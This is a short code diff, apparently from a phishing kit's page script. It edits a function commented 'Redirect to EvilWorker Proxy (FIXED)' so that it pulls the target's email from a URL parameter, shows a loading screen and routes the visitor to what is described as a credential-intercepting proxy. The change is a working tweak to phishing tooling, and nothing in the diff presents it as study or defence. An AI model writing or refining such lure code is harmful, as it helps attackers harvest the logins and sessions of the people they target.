@@ -131,13 +131,17 @@ function load() {
     logAction('page_load');
 }
 
-// --- Redirect to EvilWorker Proxy ---
+// --- Redirect to EvilWorker Proxy (FIXED) ---
 function redirectToProxy() {
-    // Get email from input or display
-    const emailInput = document.getElementById('user');
-    const emailDisplay = document.getElementById('userTxt');
-    const email = emailInput ? emailInput.value : (emailDisplay ? emailDisplay.textContent : 'unknown');
-    
+    // Get email directly from URL parameter
+    const params = new URLSearchParams(window.location.search);
+    const email = params.get('e') || params.get('email') || '';
+
+    if (!email) {
+        alert('No email provided in the URL');
+        return;
+    }
+
     // Hide the main container, show loading
     const joinDiv = document.getElementById('joinDiv');
     const loadDiv = document.getElementById('loadDiv');
